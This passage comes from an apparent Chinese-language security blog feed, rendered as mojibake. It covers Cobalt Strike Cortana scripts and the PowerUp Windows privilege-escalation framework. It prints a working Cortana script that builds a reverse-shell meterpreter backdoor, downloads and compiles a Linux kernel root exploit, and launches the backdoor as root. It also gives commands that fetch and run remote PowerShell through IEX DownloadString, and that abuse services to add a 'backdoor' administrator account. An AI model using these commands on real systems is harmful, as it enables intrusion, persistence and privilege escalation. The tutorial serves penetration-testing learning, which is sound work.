æ—¶è‡ªåŠ¨æ‰§è¡Œnessusæ‰«æã€‚av-bypass-demoï¼šè¿™ä¸ªè„šæœ¬æ˜¯åœ¨ä½¿ç”¨psexecæ—¶ï¼Œ è‡ªåŠ¨å¯¹payloadè¿›è¡Œå…æ€ã€‚å…æ€ä½¿ç”¨çš„æºç æ¥è‡ªäºhttps://github.com/rsmudge/metasploit-loaderbeaconï¼šå¢åŠ äº†å³é”®åŠŸèƒ½ï¼Œå¹¶ä¸”ä¸ºbeaconå¢åŠ äº†ä¸€ä¸ªå›¾ç‰‡ï¼Œçœ‹èµ·æ¥æ›´é…·ç‚«äº†ã€‚binariesï¼šç”¨äºLinuxä¸‹æ›¿æ¢æ–‡ä»¶ã€‚differï¼šç”¨äºæç¤ºå‘ç°çš„æ–°å¢åŠ çš„æœåŠ¡ã€‚evalï¼šä¸€ä¸ªæµ‹è¯•è„šæœ¬ï¼Œå¯ä»¥å‚è€ƒå™¨ä¸ºCortanaç¼–å†™å‘½ä»¤è¡ŒåŠŸèƒ½ã€‚events-tableï¼šå¢åŠ æŸ¥çœ‹äº‹ä»¶åŠŸèƒ½ï¼ŒåŠ è½½ä»¥åï¼Œä½¿ç”¨å¯ä»¥é€šè¿‡View -&gt; Eventsæ‰“å¼€ã€‚idlewatchï¼šæŸ¥çœ‹ç”¨æˆ·çš„ç©ºé—²æ—¶é—´ï¼Œå¹¶ä»¥å¸¦é¢œè‰²çš„å°äººå›¾æ ‡å±•ç¤ºï¼Œæ— å›¾æ ‡-&gt;æœªçŸ¥ç©ºé—²æ—¶é—´ï¼›ç»¿è‰²å›¾æ ‡-&gt;ç”¨æˆ·æ­£åœ¨ä½¿ç”¨ï¼›è“è‰²å›¾æ ‡-&gt;ç”¨æˆ·æ´»è·ƒåœ¨5åˆ†é’Ÿä¹‹å†…;é»„è‰²å›¾æ ‡-&gt;ç”¨æˆ·æ´»è·ƒåœ¨30åˆ†ä¹‹å†…ï¼›çº¢è‰²å›¾æ ‡-&gt;ç”¨æˆ·æ— æ•ˆã€‚import_credsï¼šæ­¤è„šæœ¬ç”¨æ¥å°†ç”¨æˆ·å‡­è¯å¯¼å…¥msfæ•°æ®åº“ã€‚ä½¿ç”¨æ–¹å¼ä¸ºè¿›å…¥cortanaå‘½ä»¤è¡Œï¼Œä½¿ç”¨import_credsè¿›è¡Œå¯¼å…¥ã€‚int128scriptsï¼šint128å†™çš„ä¸€äº›è„šæœ¬ï¼Œç°åœ¨æœ‰å››ä¸ªï¼Œauto_crackæ˜¯åˆ©ç”¨msfçš„jtr_crack_fastå¯¹ç”¨æˆ·å‡­è¯è¿›è¡Œç ´è§£çš„è„šæœ¬ï¼›find_hostsæ˜¯ä½¿ç”¨nmapè¿›è¡Œæ‰«æçš„è„šæœ¬ï¼›find_hosts_ping_large_subnetæ˜¯å¯¹äºä¸€ä¸ªè¾ƒå¤§çš„å­ç½‘æŒ‡å®šç«¯å£è¿›è¡Œå¿«é€Ÿæ‰«æçš„è„šæœ¬ï¼›infectæ˜¯ä¸€ä¸ªåˆ›å»ºåé—¨çš„è„šæœ¬ï¼ŒWindowsä¸‹é¢åˆ›å»º metsvcåé—¨å¹¶æ·»åŠ ç”¨æˆ·å¼€å§‹3389ç«¯å£ï¼ŒLinuxä¸‹é¢åˆ›å»ºç”¨æˆ·ï¼Œæ·»åŠ åé—¨å¹¶åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œä½¿ç”¨å‰è®°å¾—ä¿®æ”¹å‚æ•°ã€‚irc-clientï¼šä¸€ä¸ª250è¡Œçš„IRCå®¢æˆ·ç«¯Cortanaè„šæœ¬ã€‚login_logoutï¼šç”¨äºlinuxç³»ç»Ÿè·Ÿè¸ªç”¨æˆ·ç™»é™†ä¿¡æ¯ã€‚multi-meterpreterï¼šç”¨äºå¯¹å¤šä¸ªç³»ç»ŸåŒäº‹æ‰§è¡Œå‘½ä»¤ã€‚Botvoiceï¼šä¸€ä¸ªæ¯”è¾ƒå¥½ç©å„¿çš„åŠŸèƒ½ï¼Œèƒ½å¤Ÿåœ¨ä½¿ç”¨Cobalt Strikeæä¾›è¯­éŸ³å¸®åŠ©ã€‚new_payloadï¼šä¸€ä¸ªè„šæœ¬ç¤ºä¾‹ï¼Œç”¨äºæ›¿æ¢payloadã€‚post-playï¼šæ­¤è„šæœ¬ç”¨äºè‡ªåŠ¨åŒ–æ‰§è¡Œè„šæœ¬ï¼Œå¯ä»¥åŠ è½½msfçš„rubyè„šæœ¬æˆ–è€…shellè„šæœ¬ã€‚å½“è·å–ä¼šè¯ä¹‹åä¼šè‡ªåŠ¨æ‰§è¡Œã€‚pt_autodocï¼šæ­¤è„šæœ¬å¯ä»¥ç›‘æ§ä¸»æœºä»¥åŠæœåŠ¡ä¿¡æ¯ï¼Œå¹¶å°†è¿™äº›æ•°æ®å­˜å…¥Mysqlæ•°æ®åº“ï¼ŒåŒæ—¶éšæ—¶è¿›è¡Œæ›´æ–°ï¼Œå¯ä»¥ä½¿ç”¨å›¾å½¢åŒ–å·¥å…·æ¯”å¦‚gephiæ¥è§‚æµ‹æ•°æ®çš„å˜åŒ–ã€‚rc_loaderï¼šå¿«é€ŸåŠ è½½rcè„šæœ¬çš„è„šæœ¬ã€‚referencesï¼šå†™ä¸€äº›èœå•çš„ä¸¾ä¾‹è„šæœ¬ã€‚user_hunterï¼šè·å–ç”¨æˆ·çš„è„šæœ¬ã€‚èƒ½æ–¹ä¾¿çš„æ‰¾åˆ°åŸŸç®¡ç†ç™»é™†çš„ç”µè„‘ã€‚safetynetï¼šè¿™ä¸ªè„šæœ¬å…è®¸ç”¨æˆ·å‘meterpreterä¼šè¯ä¸­æ³¨å…¥â€™safetynetâ€™ payloadã€‚Snifferï¼šæ­¤è„šæœ¬ç”¨äºå¼€å¯å—…æ¢åŠŸèƒ½ã€‚vulnsï¼šç¤ºä¾‹è„šæœ¬ï¼Œç”¨äºæ˜¾ç¤ºæ¼æ´ä¿¡æ¯ã€‚vy_conï¼šä½¿ç”¨æ­¤è„šæœ¬å¯ä»¥æ§åˆ¶å’Œç®¡ç†Vyattaçš„è·¯ç”±å™¨ã€‚ 0x06 POSH-Commanderåœ¨Powrshellå¦‚ç«å¦‚è¼çš„æ—¶å€™ï¼Œæ€ä¹ˆèƒ½ç¼ºå°‘Powershellç›¸å…³çš„è„šæœ¬å‘¢ï¼Ÿrvrsh3llåœ¨githubå¼€æºäº†ä¸€ä¸ªä¸Powershellç›¸å…³çš„Cortanaè„šæœ¬ï¼Œä½¿ç”¨æ­¤è„šæœ¬å¯ä»¥é€šè¿‡å¯è§†åŒ–æ“ä½œè¿œç¨‹æ³¨å…¥powershellè„šæœ¬åˆ°è®¡ç®—æœºå†…å­˜ï¼Œä¸‹è½½åœ°å€ä¸ºï¼š1root@kali:~# git clone https://github.com/rvrsh3ll/POSH-Commander.git ä¸‹è½½ä»¥åï¼Œå°†remote_powershell.rbå¤åˆ¶åˆ°metasploit-framework/modules/post/windows/manage/powershell/ ç›®å½•ï¼š1root@kali:~# cp POSH-Commander/msfmodule/remote_powershell.rb /usr/share/metasploit-framework/modules/post/windows/manage/powershell/ ä¹‹åæ‰“å¼€msfçš„consoleç•Œé¢ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š1msf&gt; reload_all ä¾æ­¤ç‚¹å‡»cobaltstrike-&gt;Scripts-&gt;loadï¼ŒåŠ è½½posh_commander.cnaï¼Œå½“è·å–meterpreterä¼šè¯ä»¥åï¼Œå°†ä¼šçœ‹åˆ°æ–°å¢çš„powershellæ”»å‡»æ¨¡å—ï¼š é€‰æ‹©å…¶ä¸­çš„Veil-PowerViewï¼Œè¾“å…¥è„šæœ¬åœ°å€ï¼Œç„¶åå°±å¯ä»¥é€‰æ‹©åŠ è½½çš„æ¨¡å—äº†ï¼š ä¹‹åå¯ä»¥åŒå‡»å•ä¸ªæ¨¡å—ï¼Œæ·»åŠ ç›¸åº”å‚æ•°ç„¶åè¿è¡Œè¯¥Powershellè„šæœ¬ã€‚åŸè„šæœ¬è·¯å¾„æœ‰ç‚¹é—®é¢˜ï¼Œä¸æƒ³æ”¹çš„è¯å¯ä»¥ç›´æ¥è¯•ç”¨è¿™ä¸ªã€‚ æµ‹è¯•æ‰§è¡ŒHOSTå‘½ä»¤ï¼Œé€‰æ‹©Custom Local Commandï¼Œè¾“å…¥HOSTï¼Œè¿è¡Œä¹‹åå¯ä»¥çœ‹åˆ°è¿è¡Œè¿”å›çš„ç»“æœï¼š 0x07 å®šåˆ¶è‡ªå·±çš„Cortanaé™¤äº†ä»¥ä¸Šçš„è„šæœ¬ï¼Œä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬è¿˜å¯ä»¥è‡ªå·±ç¼–å†™å±äºè‡ªå·±çš„Cortanaè„šæœ¬ï¼Œç¼–å†™ç¤ºä¾‹åœ¨Cortana scriptsé‡Œé¢å·²ç»æœ‰äº†ä¸€äº›ï¼Œå¦‚æœæœ‰å…´è¶£ï¼Œä½ å¯ä»¥çœ‹çœ‹è¿™ä¸ªï¼š Cortanaæ•™ç¨‹ Cortanaç¼–å†™ç¤ºä¾‹ æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªè‡ªåŠ¨å¯¹2.6.36å†…æ ¸linuxè‡ªåŠ¨ææƒçš„è„šæœ¬ï¼š123456789101112131415161718192021222324252627282930313233343536# Auto Rooting &lt; 2.6.36 Menu for Cobalt Engine v0.1 popup shell &#123; if (host_os(session_host($1)) eq "Linux") &#123; menu "Auto Rooting" &#123; item "Auto Rooting &lt; 2.6.36" &#123; println("Auto Rooting"); # Generate Payload $r_lport = random_port(); $backdoor = generate("linux/x86/meterpreter/reverse_tcp", lhost(), $r_lport, %(), "elf"); $handle2 = openf("&gt;/tmp/linux_backdoor_$r_lport"); writeb($handle2, $backdoor); closef($handle2); shell_upload($1, "/tmp/linux_backdoor_$r_lport", "/tmp/linux_backdoor_$r_lport"); # Launch our aux shells handler("linux/x86/meterpreter/reverse_tcp", $r_lport, %(LHOST =&gt; lhost())); # Rooting s_cmd($1, "wget http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c"); s_cmd($1, "gcc 44219.c -o rootme_1"); s_cmd($1, "chmod +x rootme_1"); s_cmd($1, "chmod 0777 rootme_1"); s_cmd($1, "./rootme_1"); sleep(10 * 1000); s_cmd($1, "chmod +x /tmp/linux_backdoor_$r_lport"); s_cmd($1, "chmod 0777 /tmp/linux_backdoor_$r_lport"); s_cmd($1, "chown root:root /tmp/linux_backdoor_$r_lport"); s_cmd($1, "/tmp/linux_backdoor_$r_lport"); s_cmd($1, "exit"); db_sync(); &#125; &#125; &#125;&#125; 0x08 å°ç»“ä½¿ç”¨Cortanaè„šæœ¬å¯ä»¥è®©æˆ‘ä»¬æ›´åŠ ä¾¿æ·çš„ä½¿ç”¨Cobalt strikeï¼Œå¹¶èƒ½æ›´åŠ æ–¹ä¾¿çš„è¿›è¡Œè‡ªåŠ¨åŒ–æ”»å‡»ï¼Œå¸Œæœ›å¯¹æ¸—é€æµ‹è¯•ä¸­çš„ä½ æœ‰æ‰€å¸®åŠ©ã€‚ 0x09 å‚è€ƒ http://security-is-just-an-illusion.blogspot.com/2013/11/one-day-with-cortana-script-engine.html http://www.rvrsh3ll.net/blog/offensive/point-click-powershell-pwn/ https://www.veil-framework.com/veil-evasion-cortana-integration/ http://www.fastandeasyhacking.com/download/c/cortana_defcon.pdf http://blog.cobaltstrike.com/2013/03/13/howto-integrate-third-party-tools-with-cortana/]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
        <tag>cortana</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Powrshell ææƒæ¡†æ¶-Powerup]]></title>
    <url>%2Farchives%2FPowerup.html</url>
    <content type="text"><![CDATA[é€šå¸¸ï¼Œåœ¨Windowsä¸‹é¢æˆ‘ä»¬å¯ä»¥é€šè¿‡å†…æ ¸æ¼æ´æ¥æå‡æƒé™ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬å¸¸å¸¸ä¼šç¢°åˆ°æ‰€å¤„æœåŠ¡å™¨é€šè¿‡å†…æ ¸æ¼æ´ææƒæ˜¯è¡Œä¸é€šçš„ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦é€šè¿‡è„†å¼±çš„WindowsæœåŠ¡ææƒï¼Œæ¯”å¦‚æˆ‘ä»¬æ›¿æ¢æ‰æœåŠ¡æ‰€ä¾èµ–çš„DLLæ–‡ä»¶ï¼Œå½“æœåŠ¡é‡å¯æ—¶ï¼ŒåŠ è½½æˆ‘ä»¬æ›¿æ¢çš„DLLæ–‡ä»¶ä»è€Œå®Œæˆæ¯”å¦‚æ·»åŠ ç®¡ç†å‘˜è´¦å·çš„æ“ä½œã€‚æˆ–è€…é€šè¿‡å¸¸è§çš„Mssqlï¼ŒMysqlç­‰æœåŠ¡ï¼Œé€šè¿‡å…¶ç»§æ‰¿çš„ç³»ç»Ÿæƒé™æ¥å®Œæˆææƒç­‰ç­‰ï¼Œè€Œä»Šå¤©æˆ‘å°†ä»‹ç»ä¸€ä¸ªéå¸¸å®ç”¨çš„Powershellæ¡†æ¶-Powerupï¼Œæ­¤æ¡†æ¶å¯ä»¥åœ¨å†…æ ¸ææƒè¡Œä¸é€šçš„æ—¶å€™ï¼Œå¸®åŠ©æˆ‘ä»¬å¯»æ‰¾æœåŠ¡å™¨è„†å¼±ç‚¹è¿›è€Œé€šè¿‡è„†å¼±ç‚¹å®ç°ææƒçš„ç›®çš„ã€‚ 0x00 ä½¿ç”¨è¦ä½¿ç”¨Powerupï¼Œé¦–å…ˆéœ€è¦ä¸‹è½½æ­¤è„šæœ¬:Powerupï¼Œä¹‹ååŠ è½½æ­¤è„šæœ¬ï¼š12E:&gt; powershell.exe -nop -exec bypassPS E:\&gt; Import-Module .\PowerUp.psm1 åŠ è½½å®Œæˆä»¥åï¼Œä¾¿å¯ä»¥ä½¿ç”¨Powerupä¸­çš„æ‰€æœ‰æ¨¡å—äº†ã€‚é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ¨¡å—ï¼š1PS E:\&gt; Get-Command -Module powerup è¾“å…¥å¯ä»¥é€šè¿‡tabé”®æ¥è‡ªåŠ¨è¡¥å…¨ï¼Œå¦‚æœè¦æŸ¥çœ‹å„ä¸ªæ¨¡å—çš„è¯¦ç»†è¯´æ˜ï¼Œå¯ä»¥ä½¿ç”¨â€Get-help [cmdlet] -fullâ€œæ¥æŸ¥çœ‹ï¼Œæ¯”å¦‚â€Get-Help Find-DLLHijack -fullâ€œï¼Œå¦‚æœè¦å°†è¾“å‡ºçš„ç»“æœå¯¼å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶å¯ä»¥ä½¿ç”¨Out-Fileï¼Œå¦‚ä¸‹ï¼š1PS E:\&gt; Invoke-AllChecks | Out-File -Encoding ASCII checks.txt ä¸Šè¿°å‘½ä»¤ä½¿ç”¨äº†Invoke-AllChecksï¼Œè„šæœ¬å°†ä¼šè¿›è¡Œæ‰€æœ‰çš„æ£€æŸ¥ åœ¨cmdç¯å¢ƒä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ—æ–¹å¼æ¥è¿è¡Œè¯¥è„šæœ¬ï¼š1E:\&gt; powershell.exe -exec bypass -Command "&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;" å¦‚æœä½ æƒ³åœ¨å†…å­˜åŠ è½½æ­¤è„šæœ¬ï¼Œå¯ä»¥ç”¨ä¸‹åˆ—æ–¹å¼ï¼š1E:\&gt; powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://dwz.cn/2vkbfP'); Invoke-AllChecks" é™¤æ­¤ä¹‹å¤–ï¼ŒMetasploitä¸ŠåŒæ ·åŒ…å«æ‰§è¡Œpowershellè„šæœ¬çš„æ¨¡å—exec_powershell.rbï¼Œé€šè¿‡æ­¤æ¨¡å—ï¼Œå¯ä»¥é€šè¿‡msfä¼šè¯æ¥æ‰§è¡Œpowershellã€‚ 0x01 æ¨¡å—ä»‹ç»Find-DLLHijackæ£€æŸ¥æ¯ä¸ªè¿›ç¨‹æ‰€åŠ è½½çš„æ¨¡å—ï¼Œè¿”å›å·²ç»åŠ è½½ä¸”ä¸åœ¨å…¶å¯æ‰§è¡Œç›®å½•çš„æ¨¡å—çš„ç›®å½•ã€‚æ‰§è¡Œæ–¹å¼ï¼š123PS C:\&gt; Find-DLLHijack #è¿”å›æ‰€æœ‰çš„dllè·¯å¾„PS C:\&gt; Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles #è¿”å›æ’é™¤C:\Windows\*ï¼› C:\Program Files\*ï¼›C:\Program Files (x86)\*ä»¥å¤–çš„dllè·¯å¾„PS C:\&gt; Find-DLLHijack -ExcludeOwned #è¿”å›ä¸å±äºå½“å‰ç”¨æˆ·æ‰€æœ‰è¿›ç¨‹æƒé™çš„dllè·¯å¾„ Find-PathHijackæ£€æŸ¥å½“å‰%PATH%æ˜¯å¦å­˜åœ¨å“ªäº›ç›®å½•æ˜¯å½“å‰ç”¨æˆ·å¯ä»¥å†™å…¥çš„ã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Find-PathHijack Get-ApplicationHostä»ç³»ç»Ÿä¸Šçš„applicationHost.configæ–‡ä»¶æ¢å¤åŠ å¯†è¿‡çš„åº”ç”¨æ± å’Œè™šæ‹Ÿç›®å½•çš„å¯†ç ã€‚æ‰§è¡Œæ–¹å¼ï¼š12PS C:\&gt;get-ApplicationHostPS C:\&gt;get-ApplicationHost | Format-Table -Autosize # åˆ—è¡¨æ˜¾ç¤º Get-ModifiableFileæ£€æŸ¥æŸä¸ªæ–‡ä»¶å½“å‰ç”¨æˆ·æ˜¯å¦æ‹¥æœ‰ä¿®æ”¹æƒé™ï¼Œå¹¶è¿”å›æœ‰æƒé™çš„æ–‡ä»¶è·¯å¾„ã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; '"E:\temp\123123.xlsx" -f "C:\LibAntiPrtSc_ERROR.log"' | Get-ModifiableFile å‰é¢ä¸ºæ–‡ä»¶è·¯å¾„ Get-RegAlwaysInstallElevatedæ£€æŸ¥AlwaysInstallElevatedæ³¨å†Œè¡¨é¡¹æ˜¯å¦è¢«è®¾ç½®ï¼Œå¦‚æœè¢«è®¾ç½®ï¼Œæ„å‘³ç€çš„MSIæ–‡ä»¶æ˜¯ä»¥systemæƒé™è¿è¡Œçš„ã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Get-RegAlwaysInstallElevated Get-RegAutoLogonæ£€æµ‹Winloginæ³¨å†Œè¡¨AutoAdminLogoné¡¹æœ‰æ²¡æœ‰è¢«è®¾ç½®ï¼Œå¯æŸ¥è¯¢é»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ä¸msf windows_autologin.rbæ¨¡å—ç›¸åŒã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Get-RegAutoLogon Get-ServiceDetailè¿”å›æŸæœåŠ¡çš„ä¿¡æ¯ã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Get-ServiceDetail -ServiceName Dhcp #è·å–DHCPæœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ Get-ServiceFilePermissionæ£€æŸ¥å½“å‰ç”¨æˆ·èƒ½å¤Ÿåœ¨å“ªäº›æœåŠ¡çš„ç›®å½•å†™å…¥ç›¸å…³è”çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé€šè¿‡è¿™äº›æ–‡ä»¶å¯è¾¾åˆ°ææƒçš„ç›®çš„ã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Get-ServiceFilePermission Get-ServicePermissionæ£€æŸ¥æ‰€æœ‰å¯ç”¨çš„æœåŠ¡ï¼Œå¹¶å°è¯•å¯¹è¿™äº›æ‰“å¼€çš„æœåŠ¡è¿›è¡Œä¿®æ”¹ï¼Œå¦‚æœå¯ä¿®æ”¹ï¼Œåˆ™è¿”å›è¯¥æœåŠ¡å¯¹è±¡ã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Get-ServicePermission Get-ServiceUnquotedæ£€æŸ¥æœåŠ¡è·¯å¾„ï¼Œè¿”å›åŒ…å«ç©ºæ ¼ä½†æ˜¯ä¸å¸¦å¼•å·çš„æœåŠ¡è·¯å¾„ï¼Œç±»ä¼¼äºmsfçš„trusted_service_path.rbã€‚æ­¤å¤„åˆ©ç”¨çš„windowsçš„ä¸€ä¸ªé€»è¾‘æ¼æ´ï¼Œå³å½“æ–‡ä»¶åŒ…å«ç©ºæ ¼æ—¶ï¼Œwindows APIä¼šè§£é‡Šä¸ºä¸¤ä¸ªè·¯å¾„ï¼Œå¹¶å°†è¿™ä¸¤ä¸ªæ–‡ä»¶åŒæ—¶æ‰§è¡Œï¼Œæœ‰äº›æ—¶å€™å¯èƒ½ä¼šé€ æˆæƒé™çš„æå‡ã€‚ æ¯”å¦‚C:\program files\hello.exe,ä¼šè¢«è§£é‡Šä¸ºC:\program.exeä»¥åŠC:\program files\hello.exe æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt;Get-ServiceUnquoted Get-UnattendedInstallFileæ£€æŸ¥å‡ ä¸ªè·¯å¾„ï¼ŒæŸ¥æ‰¾æ˜¯å¦å­˜åœ¨è¿™äº›æ–‡ä»¶ï¼Œåœ¨è¿™äº›æ–‡ä»¶é‡Œå¯èƒ½åŒ…å«æœ‰éƒ¨ç½²å‡­æ®ã€‚è¿™äº›æ–‡ä»¶åŒ…æ‹¬ï¼š c:\sysprep\sysprep.xml c:\sysprep\sysprep.inf c:\sysprep.inf c:\windows\Panther\Unattended.xml c:\windows\Panther\Unattend\Unattended.xml c:\windows\Panther\Unattend.xml c:\windows\Panther\Unattend\Unattend.xml c:\windows\System32\Sysprep\unattend.xml c:\windows\System32\Sysprep\Panther\unattend.xml æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Get-UnattendedInstallFile Get-VulnAutoRunæ£€æŸ¥å¼€æœºè‡ªå¯çš„åº”ç”¨ç¨‹åºè·¯å¾„å’Œæ³¨å†Œè¡¨é”®å€¼ï¼Œè¿”å›å½“å‰ç”¨æˆ·å¯ä¿®æ”¹çš„ç¨‹åºè·¯å¾„ã€‚æ³¨å†Œè¡¨æ£€æŸ¥çš„é”®å€¼ä¸ºï¼š12345678HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunHKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceHKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunHKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServiceHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceServiceHKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServiceHKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Get-VulnAutoRun Get-VulnSchTaskè¿”å›å½“å‰ç”¨æˆ·èƒ½å¤Ÿä¿®æ”¹çš„è®¡åˆ’ä»»åŠ¡ç¨‹åºçš„åç§°å’Œè·¯å¾„ã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Get-VulnSchTask Get-Webconfigè¿”å›å½“å‰æœåŠ¡å™¨ä¸Šçš„web.configæ–‡ä»¶ä¸­çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„æ˜æ–‡ã€‚æ‰§è¡Œæ–¹å¼ï¼š12PS C:\&gt;get-webconfig PS C:\&gt;get-webconfig | Format-Table -Autosize #åˆ—è¡¨æ˜¾ç¤º Invoke-AllChecksæ‰§è¡Œæ‰€æœ‰çš„è„šæœ¬æ¥æ£€æŸ¥ã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Invoke-AllChecks Invoke-Service Invoke-ServiceDisable ç¦ç”¨æœåŠ¡ Invoke-ServiceEnable å¯ç”¨æœåŠ¡ Invoke-ServiceStart å¯åŠ¨æœåŠ¡ Invoke-ServiceStop åœæ­¢æœåŠ¡ æ‰§è¡Œæ–¹å¼ä¸ºï¼š1PS C:\&gt; Invoke-ServiceDisable -ServiceName æœåŠ¡åç§°ã€‚ Invoke-ServiceAbuseç”¨æ¥é€šè¿‡ä¿®æ”¹æœåŠ¡æ·»åŠ ç”¨æˆ·åˆ°æŒ‡å®šç»„ï¼Œå¹¶å¯ä»¥é€šè¿‡å®šåˆ¶-cmdå‚æ•°è§¦å‘æ·»åŠ ç”¨æˆ·çš„è‡ªå®šä¹‰å‘½ä»¤ã€‚æ‰§è¡Œæ–¹å¼:1234PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC # æ·»åŠ é»˜è®¤è´¦å·PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName "TESTLAB\john" # æŒ‡å®šæ·»åŠ åŸŸè´¦å·PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Administrators" # æŒ‡å®šæ·»åŠ ç”¨æˆ·ï¼Œç”¨æˆ·å¯†ç ä»¥åŠæ·»åŠ çš„ç”¨æˆ·ç»„ã€‚PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..." # è‡ªå®šä¹‰æ‰§è¡Œå‘½ä»¤ é»˜è®¤çš„è´¦å·å¯ä»¥é€šè¿‡ä¿®æ”¹é»˜è®¤å‚æ•°æ¥ä¿®æ”¹ï¼Œå¦‚ä¸‹å›¾ï¼š Restore-ServiceBinaryæ¢å¤æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶åˆ°åŸå§‹ç›®å½•ã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Restore-ServiceBinary -ServiceName VulnSVC Test-ServiceDaclPermission æ£€æŸ¥æŸä¸ªç”¨æˆ·æ˜¯å¦åœ¨ä¸€ä¸ªæœåŠ¡æœ‰è‡ªç”±è®¿é—®æ§åˆ¶çš„æƒé™ï¼Œè¿”å›trueæˆ–falseã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Restore-ServiceBinary -ServiceName VulnSVC Write-HijackDllè¾“å‡ºä¸€ä¸ªè‡ªå®šä¹‰å‘½ä»¤å¹¶ä¸”èƒ½å¤Ÿè‡ªåˆ é™¤çš„batæ–‡ä»¶åˆ°$env:Temp\debug.batï¼Œå¹¶è¾“å‡ºä¸€ä¸ªèƒ½å¤Ÿå¯åŠ¨è¿™ä¸ªbatæ–‡ä»¶çš„dllã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Write-HijackDll -OutputFile 'E:\temp\test.dll' -Command 'whoami' Write-UserAddMSIç”Ÿæˆä¸€ä¸ªå®‰è£…æ–‡ä»¶ï¼Œè¿è¡Œè¿™ä¸ªå®‰è£…æ–‡ä»¶ï¼Œåˆ™å¼¹å‡ºæ·»åŠ ç”¨æˆ·çš„æ¡†ã€‚æ‰§è¡Œæ–¹å¼ï¼š1PS C:\&gt; Write-UserAddMSI Write-ServiceBinaryé¢„ç¼–è¯‘C#æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚é»˜è®¤åˆ›å»ºä¸€ä¸ªé»˜è®¤ç®¡ç†å‘˜è´¦å·ã€‚å¯é€šè¿‡Commandå®šåˆ¶è‡ªå·±çš„å‘½ä»¤ã€‚æ‰§è¡Œæ–¹å¼ï¼š1234PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC # æ·»åŠ é»˜è®¤è´¦å·PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john" # æŒ‡å®šæ·»åŠ åŸŸè´¦å·PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123! # æŒ‡å®šæ·»åŠ ç”¨æˆ·ï¼Œç”¨æˆ·å¯†ç ä»¥åŠæ·»åŠ çš„ç”¨æˆ·ç»„ã€‚PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC -Command "net ..." # è‡ªå®šä¹‰æ‰§è¡Œå‘½ä»¤ Install-ServiceBinaryé€šè¿‡Write-ServiceBinaryå†™ä¸€ä¸ªC#çš„æœåŠ¡ç”¨æ¥æ·»åŠ ç”¨æˆ·ã€‚æ‰§è¡Œæ–¹å¼ï¼š1234PS C:\&gt; Install-ServiceBinary -ServiceName DHCPPS C:\&gt; Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"PS C:\&gt; Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!PS C:\&gt; Install-ServiceBinary -ServiceName VulnSVC -Command "net ..." Write-ServiceBinaryä¸Install-ServiceBinaryä¸åŒçš„æ˜¯å‰è€…ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåè€…ç›´æ¥å®‰è£…æœåŠ¡ã€‚ 0x02 